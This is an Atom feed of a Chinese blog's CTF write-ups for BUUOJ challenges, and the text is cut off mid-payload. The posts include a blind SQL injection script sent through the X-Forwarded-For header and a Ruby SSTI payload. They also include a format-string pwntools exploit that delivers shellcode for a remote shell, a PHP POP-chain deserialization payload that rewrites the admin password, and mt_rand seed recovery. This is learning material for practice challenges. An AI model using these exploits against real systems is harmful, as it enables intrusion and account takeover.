<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>upload</title>
  
  <subtitle>每天都要开心!</subtitle>
  <link href="http://upload.love/atom.xml" rel="self"/>
  
  <link href="http://upload.love/"/>
  <updated>2021-08-04T16:02:24.721Z</updated>
  <id>http://upload.love/</id>
  
  <author>
    <name>upload</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUU WEB PWN</title>
    <link href="http://upload.love/2021/08/04/BUU-WEB-PWN/"/>
    <id>http://upload.love/2021/08/04/BUU-WEB-PWN/</id>
    <published>2021-08-04T03:43:03.000Z</published>
    <updated>2021-08-04T16:02:24.721Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h1><h2 id="知识点：xff-二次注入"><a href="#知识点：xff-二次注入" class="headerlink" title="知识点：xff 二次注入"></a>知识点：xff 二次注入</h2><p>poc</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; or 1 or &#39;0</span><br><span class="line">111</span><br><span class="line">111 </span><br><span class="line">是1</span><br><span class="line">0&#39; or 0 or &#39;0</span><br><span class="line">111</span><br><span class="line">111</span><br><span class="line">是0</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210804114745.png" alt="image-20210804114738032"></p><p><code>https://www.jianshu.com/p/08aabdbc8a7b</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:25902/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.format(i,mid)</span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;OUTFOX_SEARCH_USER_ID_NCOO&quot;</span>: <span class="string">&quot;1935872068.9989924&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;UM_distinctid&quot;</span>: <span class="string">&quot;17b0b3c6b83d44-005a7fe99cb475-d7e163f-144000-17b0b3c6b84c1f&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;track_uuid&quot;</span>: <span class="string">&quot;bad65c37-76b0-4e9f-9145-7e33ee6a045e&quot;</span>,</span><br><span class="line">                         <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                         &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = url, headers = burp0_cookies)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;OUTFOX_SEARCH_USER_ID_NCOO&quot;</span>: <span class="string">&quot;1935872068.9989924&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;UM_distinctid&quot;</span>: <span class="string">&quot;17b0b3c6b83d44-005a7fe99cb475-d7e163f-144000-17b0b3c6b84c1f&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;track_uuid&quot;</span>: <span class="string">&quot;bad65c37-76b0-4e9f-9145-7e33ee6a045e&quot;</span>,</span><br><span class="line">                         <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                         &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = url, headers = burp0_cookies)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;OUTFOX_SEARCH_USER_ID_NCOO&quot;</span>: <span class="string">&quot;1935872068.9989924&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;UM_distinctid&quot;</span>: <span class="string">&quot;17b0b3c6b83d44-005a7fe99cb475-d7e163f-144000-17b0b3c6b84c1f&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;track_uuid&quot;</span>: <span class="string">&quot;bad65c37-76b0-4e9f-9145-7e33ee6a045e&quot;</span>,</span><br><span class="line">                         <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                         &#125;</span><br><span class="line">        r = requests.post(url = url, headers = burp0_cookies)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&#x27;too fast&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line"><span class="comment">#F4l9_t4b1e</span></span><br><span class="line"><span class="comment">#F4l9_C01uMn</span></span><br></pre></td></tr></table></figure><h1 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h1><h2 id="知识点：ruby-ssti"><a href="#知识点：ruby-ssti" class="headerlink" title="知识点：ruby ssti"></a>知识点：ruby ssti</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后端ruby写的</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/xing901022/p/4918832.html">如何运行ruby代码</a></p><p>1 -e</p><p>2 在命令行输入irb</p><p>3 文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210804133115.png" alt="image-20210804133115382"></p><p>代码看的还可以！发现可以直接传参控制输出！ssti！</p><p>这里需要用到<code>Ruby</code>语言的一个特性。我们可以利用<code>$&#39;</code>来返回正则匹配结果的右边。举个例子：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span> <span class="string">&quot;There were once ten tin robots standing in a row.&quot;</span> =~ <span class="regexp">/robot/</span></span><br><span class="line"><span class="comment">#意思就是正则匹配 robot</span></span><br><span class="line">=&gt; <span class="number">24</span></span><br><span class="line"><span class="meta">&gt;&gt;</span> $&#x27;</span><br><span class="line">=&gt; <span class="string">&quot;s standing in a row.&quot;</span></span><br><span class="line"><span class="comment">#返回了右半部分。</span></span><br><span class="line">=&gt; <span class="string">&quot;ro&quot;</span></span><br><span class="line">=&gt; nil</span><br></pre></td></tr></table></figure><p><code>题目里当参数SECRET值不存在时！ENV[&quot;SECRET&quot;]就正则匹配！相当于它自己了！</code></p><p>payload:</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;<span class="keyword">do</span>=&lt;%=$&#x27;%&gt; is working</span><br><span class="line">/work?SECRET=&amp;name=%<span class="number">3</span>c%<span class="number">25</span>%<span class="number">3</span>d%<span class="number">24</span>%<span class="number">27</span>%<span class="number">25</span>%<span class="number">3</span>e&amp;<span class="keyword">do</span>=%<span class="number">3</span>c%<span class="number">25</span>%<span class="number">3</span>d%<span class="number">24</span>%<span class="number">27</span>%<span class="number">25</span>%<span class="number">3</span>e%<span class="number">20</span>%<span class="number">69</span>%<span class="number">73</span>%<span class="number">20</span>%<span class="number">77</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">6</span>b%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">67</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;c645dd09-6653-4e11-9066-e6b970a35866&quot;,</span><br><span class="line">  &quot;jkl&quot;: 1e+77</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>string</p><h2 id="知识点-：格式化字符串"><a href="#知识点-：格式化字符串" class="headerlink" title="知识点 ：格式化字符串"></a>知识点 ：格式化字符串</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210804171149.png" alt="image-20210804171149213"></p><p>其实不太懂为什么掉到这里就可以直接有shell了！</p><p> <code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code></p><p>先去理解过程！</p><p>首先v4就是V3  V3的地址一开始也给了！</p><p><code>secret[0] is 19da260</code><br><code>secret[1] is 19da264</code></p><p>发现有这3个函数！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210804171350.png" alt="image-20210804171350312"></p><p><code>sub_400BB9</code>里有格式化字符串漏洞！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210804171412.png" alt="image-20210804171411976"></p><p>就就通过漏洞重写<code>V3[0]</code>！</p><p>让<code>V3[0] = V3[1]</code></p><p>输入 <code>AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code></p><p>或者 <code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload</span><br><span class="line">east</span><br><span class="line">1</span><br><span class="line">AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br><span class="line">AAAA,e92e47e3,e92e58c0,e9008264,c,0,e92e02a0,0,41414141,252c7825,2c78252c,78252c78,252c7825,78252cI</span><br></pre></td></tr></table></figure><p>发现偏移量是8！</p><p>其实这个题我想的是 偏移8位！直接给<code>format  付上v3地址 </code>  然后偏移8个覆盖自己！但是最后不行！</p><p>只能给format 前一个v2地址赋值！然后偏移7个！我人有点晕 不知道为什么自己的思路不行！</p><p>它的思路也很明确！ 就是覆盖V2！ v2就在format 前面！所以偏移7位就行了！🙄🙄🙄 </p><p>完了！不知道自己思路那错了！太菜了！哭哭哭！</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/8/4 17:19</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : string.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">            upload = process(<span class="string">&quot;string&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            upload = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">52607</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[!] Content error~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    upload.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">    addr = int(upload.recvuntil(<span class="string">&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;addr&quot;</span>,addr)</span><br><span class="line"></span><br><span class="line">    payload = str(addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">77</span> + <span class="string">b&#x27;%8$n&#x27;</span>  <span class="comment"># 8+77   85个字节  偏移8位后 覆盖V3 发现思路有问题!</span></span><br><span class="line">    payload = <span class="string">&quot;%85c%7$n&quot;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>, <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>, <span class="string">&quot;east&quot;</span>)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>, str(addr))</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;And, you wish is:\n&quot;</span>, payload)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    upload.sendlineafter(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">    upload.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h1><h2 id="知识点：mt-rand伪随机数！"><a href="#知识点：mt-rand伪随机数！" class="headerlink" title="知识点：mt_rand伪随机数！"></a>知识点：mt_rand伪随机数！</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username=crispr&amp;password=<span class="number">1</span><span class="string">&#x27;/**/||/**/1/**/||/**/&#x27;</span>&amp;Private_key=XuNhoueCDCGc&amp;login=%E7%<span class="number">99</span>%BB%E5%BD%<span class="number">95</span></span><br></pre></td></tr></table></figure><p><strong>爆破seed</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/8/4 23:37</span></span><br><span class="line"><span class="comment"># @Author  : upload</span></span><br><span class="line"><span class="comment"># @File    : [MRCTF2020]Ezaudit.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">a = [<span class="number">36</span>,<span class="number">36</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">42</span>,<span class="number">42</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">41</span>,<span class="number">41</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">43</span>,<span class="number">43</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">0</span>,<span class="number">61</span>]</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    key += chr(i)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>然后用工具跑出种子！</p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php <span class="number">5</span> 的环境</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUU web </summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUWEB PWN</title>
    <link href="http://upload.love/2021/08/03/BUUWEB-PWN/"/>
    <id>http://upload.love/2021/08/03/BUUWEB-PWN/</id>
    <published>2021-08-03T01:15:36.000Z</published>
    <updated>2021-08-04T04:00:53.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="number">1</span>;  <span class="comment">// string(4) i:1;</span></span><br><span class="line">$b= <span class="string">&#x27;a&#x27;</span>; <span class="comment">//tring(8) s:1:&quot;a&quot;;</span></span><br><span class="line">$c = <span class="keyword">new</span> Info(); <span class="comment">//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;N;&#125;</span></span><br><span class="line">$d = <span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>); <span class="comment">//a:1:&#123;i:0;s:1:&quot;b&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">$c-&gt;nickname=$d;</span><br><span class="line">var_dump(serialize($c));<span class="comment">//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:1:&quot;b&quot;;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>太菜了！我tm的！</p><p>这个题研究1天多了了！昨天睡觉前看的！！！🐎🐎🐎🐎的！</p><p>主要是自己以前就挺烦代码逻辑题的！</p><p>每次做这种题都感觉再掉头发！！！！ 太难了！呜呜呜！</p><h2 id="知识点-pop链！-反序列化字符逃逸！"><a href="#知识点-pop链！-反序列化字符逃逸！" class="headerlink" title="知识点:pop链！+ 反序列化字符逃逸！"></a>知识点:pop链！+ 反序列化字符逃逸！</h2><p>我这里必须注意一点！ 每种数据类型序列化后格式是不一样的！ 我一开以为结束都需要分号的！但是死活反序列化不了！调试也不行！后来看了看 有些 数组和对象 是以{} 结束了！注意一下！ 不然难受死了！！😇😇😇😇</p><p>pop链这我就不多说了！</p><p><code>UpdateHelper 到 $this-&gt;sql; 到User的__toString 到Info的__call 到dbCtrl的login方法 直接更改admin密码！</code></p><p>不过怎么启动这条链呢！</p><p>用下面的东西！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));入口</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以直接把pop链传入<code>nickname</code> 再通过反序列化字符逃逸 逃逸出UpdateHelper对象！</p><p>因为字符串没意义嘛！</p><h3 id="pop-payload"><a href="#pop-payload" class="headerlink" title="pop payload"></a>pop payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$updatehelper = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$updatehelper -&gt;sql=<span class="keyword">new</span> User();; <span class="comment">//tostring</span></span><br><span class="line">$updatehelper -&gt;sql-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">$updatehelper -&gt;sql-&gt;age=<span class="string">&quot;update user set password=&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; where username=?&quot;</span>;</span><br><span class="line"></span><br><span class="line">$updatehelper -&gt;sql-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($updatehelper);</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;newinfo&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">76</span>:<span class="string">&quot;update user set password=&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">8</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;hostname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;127.0.0.1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbuser&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbpass&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;database&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;mysqli&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span 